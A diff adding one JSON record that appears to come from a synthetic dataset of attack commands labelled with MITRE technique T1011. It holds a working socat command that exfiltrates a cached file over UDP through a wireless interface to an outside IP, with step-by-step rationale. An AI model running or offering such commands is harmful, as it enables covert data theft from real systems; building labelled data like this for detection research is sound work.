@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && socat -u FILE:/home/user/.cache/k.bin UDP4-SENDTO:10.55.88.7:49401,interface=wlan1",
+  "explanation": "Uses socat to send a file via UDP bound explicitly to wlan1, leveraging a separate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Confirm wlan1 presence via iwconfig without making changes.",
+    "Select the outbound interface explicitly (wlan1) to ensure off-path exfiltration.",
+    "Use UDP on a non-standard port for a single-shot transfer with minimal system impact."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c920e182",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
